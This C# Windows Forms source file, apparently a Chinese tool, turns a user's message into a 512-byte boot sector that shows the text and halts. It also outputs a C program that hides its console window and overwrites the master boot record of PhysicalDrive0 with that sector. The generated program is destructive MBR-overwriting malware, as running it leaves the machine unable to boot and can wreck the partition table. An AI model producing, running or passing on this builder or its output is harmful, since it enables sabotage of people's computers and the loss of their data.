using System;

using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Threading;


namespace 汇编HelloWorld生成器
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        
        private void button1_Click(object sender, EventArgs e)
        {
            timer1.Enabled = true;
            if (Str.Text.Length == 0 || textBox2.Text.Length == 0 || textBox3.Text.Length == 0 || textBox5.Text.Length == 0 || textBox2.Text.Length == 6)
            {
                MessageBox.Show("请输入内容");
                goto exit;
            }
            if(Str.Text.Length > 480)
            {
                Str.Text = Str.Text.Substring(0, 480);
            }
            string x = Convert.ToString(Convert.ToInt16(textBox5.Text), 16); //x坐标
            Refresh();
            string y = Convert.ToString(Convert.ToInt16(textBox6.Text), 16); //y坐标
            string a = textBox2.Text; //前景色
            string b = textBox3.Text; //背景色
            if (x.Length == 1)
            {
                x = "0" + x;
            }
            if (y.Length == 1)
            {
                y = "0" + y;
            }
            Refresh();
            string strH = ""; //字符串，最多480字节
            byte[] strtemp = Encoding.ASCII.GetBytes(Str.Text);
            Refresh();
            int strf = 0;
            for (int xi = 0; xi < 480; xi++)
            {
                try
                {
                    strH += Convert.ToString(strtemp[xi], 16);
                }
                catch (Exception)
                {
                    strH += "00";
                    strf++;
                }
            }
            Refresh();
            strf = 480 - strf;
            string strMaxstr = Convert.ToString(strf,16).ToString();
            switch (strMaxstr.Length)
            {
                case 1:
                    strMaxstr = "000" + strMaxstr;
                    break;
                case 2:
                    strMaxstr = "00" + strMaxstr;
                    break;
                case 3:
                    strMaxstr = "0" + strMaxstr;
                    break;
                default:
                    strMaxstr = "01e0";
                    break;
            }
            string strMax = strMaxstr.Substring(2, 2) + strMaxstr.Substring(0, 2); //字符串大小
            string BinCode = $@"8CC88ED88EC0B81E7CB9{strMax}89C5B413B000B700B3{b}{a}B6{y}B2{x}CD10FAF4{strH}55AA".ToUpper();
            string asmCode = $@"org 0x7c00
mov ax, cs 
mov ds, ax
mov es, ax
mov ax, error_msg1
mov cx, error_msg1_len
mov bp, ax
mov ah, 0x13
mov al, 0
mov bh, 0
mov bl, 0x{b}{a}
mov dh,{y}
mov dl,{x}
int 0x10
cli
hlt
error_msg1 db ""{Str.Text}""
error_msg1_len equ $ -error_msg1
times 510 - ($ - $$) db 0
dw 0xAA55";
            Refresh();
            textBox7.Text = asmCode;
            Refresh();
            char[] BinCodeAttay = BinCode.ToCharArray();
            //2n-1 + 2n

            string txt16 = ""; //左边
            string Cpptxt16 = "0x"; //右边
            byte[] bintempint = new byte[512];
            for (int temp0x = 1; temp0x <= 512; temp0x++)
            {
                bintempint[temp0x - 1] = (byte)Convert.ToInt32(BinCodeAttay[temp0x * 2 - 1 - 1].ToString() + BinCodeAttay[temp0x * 2 - 1].ToString(), 16);
                txt16 += BinCodeAttay[temp0x * 2 - 1 - 1].ToString() + BinCodeAttay[temp0x * 2 - 1].ToString();
                Cpptxt16 += BinCodeAttay[temp0x * 2 - 1 - 1].ToString() + BinCodeAttay[temp0x * 2 - 1].ToString() + ",0x";
            }

            try
            {
                BinaryWriter WriteBin = new BinaryWriter(new FileStream("$MBR", FileMode.OpenOrCreate), Encoding.UTF7);
                WriteBin.Seek(0, SeekOrigin.Begin);
                WriteBin.Write(bintempint);
                WriteBin.Close();
            }
            catch (Exception)
            {
                MessageBox.Show("Error!");
                goto exit;
            }

            Refresh();
            Thread.Sleep(200);
            Refresh();
            textBox1.Text = txt16;
            Refresh();
            Cpptxt16 = Cpptxt16.Substring(0, Cpptxt16.Length - 3);
            Refresh();
            textBox4.Text = Cpptxt16;
            string asmapp = $@"#include <windows.h>
int main(){{
ShowWindow(FindWindow(TEXT(""ConsoleWindowClass""), 0), 0);
unsigned char MBR[] = {{{Cpptxt16}}};
HANDLE a = CreateFileA(""\\\\.\\PhysicalDrive0"", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
DWORD wb;
WriteFile(a,(LPVOID)MBR,sizeof(MBR),&wb,NULL);}}";
            Refresh();
            textBox8.Text = asmapp;
            MessageBox.Show("文件储存在当前的目录下的\"$MBR\"里", "OK!");
            timer1.Enabled = false;
        exit:;
        }
        IMG start = new IMG();
        public string x2 ="";
        private void button2_Click(object sender, EventArgs e) //颜色参考按钮
        {
            string x1 = start.ToString();
            if (x1 != x2)
            {
                start = new IMG();
            }
            start.Show();
            x2 = start.ToString();
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            if (textBox2.Text.Length < 2 && (textBox2.Text.StartsWith("0") || textBox2.Text.StartsWith("1") || textBox2.Text.StartsWith("2") || textBox2.Text.StartsWith("3") || textBox2.Text.StartsWith("4") || textBox2.Text.StartsWith("5") || textBox2.Text.StartsWith("6") || textBox2.Text.StartsWith("7") || textBox2.Text.StartsWith("8") || textBox2.Text.StartsWith("9") || textBox2.Text.StartsWith("a") || textBox2.Text.StartsWith("b") || textBox2.Text.StartsWith("c") || textBox2.Text.StartsWith("d") || textBox2.Text.StartsWith("e") || textBox2.Text.StartsWith("f")))
            {

            }
            else
            {
                textBox2.Text = "";
            }
        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {
            if (textBox3.Text.Length < 2 && (textBox3.Text.StartsWith("0") || textBox3.Text.StartsWith("1") || textBox3.Text.StartsWith("2") || textBox3.Text.StartsWith("3") || textBox3.Text.StartsWith("4") || textBox3.Text.StartsWith("5") || textBox3.Text.StartsWith("6") || textBox3.Text.StartsWith("7") || textBox3.Text.StartsWith("8") || textBox3.Text.StartsWith("9") || textBox3.Text.StartsWith("a") || textBox3.Text.StartsWith("b") || textBox3.Text.StartsWith("c") || textBox3.Text.StartsWith("d") || textBox3.Text.StartsWith("e") || textBox3.Text.StartsWith("f")))
            {

            }
            else
            {
                textBox3.Text = "";
            }
        }

        private void textBox5_TextChanged(object sender, EventArgs e)
        {
            if (textBox5.Text.Length < 3 && (textBox5.Text.StartsWith("0") || textBox5.Text.StartsWith("1") || textBox5.Text.StartsWith("2") || textBox5.Text.StartsWith("3") || textBox5.Text.StartsWith("4") || textBox5.Text.StartsWith("5") || textBox5.Text.StartsWith("6") || textBox5.Text.StartsWith("7") || textBox5.Text.StartsWith("8") || textBox5.Text.StartsWith("9")))
            {

            }
            else
            {
                textBox5.Text = "";
            }
        }

        private void textBox6_TextChanged(object sender, EventArgs e)
        {
            if (textBox6.Text.Length < 3 && (textBox6.Text.StartsWith("0") || textBox6.Text.StartsWith("1") || textBox6.Text.StartsWith("2") || textBox6.Text.StartsWith("3") || textBox6.Text.StartsWith("4") || textBox6.Text.StartsWith("5") || textBox6.Text.StartsWith("6") || textBox6.Text.StartsWith("7") || textBox6.Text.StartsWith("8") || textBox6.Text.StartsWith("9")))
            {

            }
            else
            {
                textBox6.Text = "";
            }
        }

        public bool strbool = false;
        private void Str_TextChanged(object sender, EventArgs e)
        {
            if (strbool == false)
            {
                strbool = true;
                MessageBox.Show("最好只输入英文字母，尽量不要输入特殊符号");
            }
            if (Str.Text.Length > 480)
            {
                MessageBox.Show("长度不能超过480字节");
            }
            
        }

        
        private void button3_Click(object sender, EventArgs e)
        {
            
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            Refresh();
        }
    }
}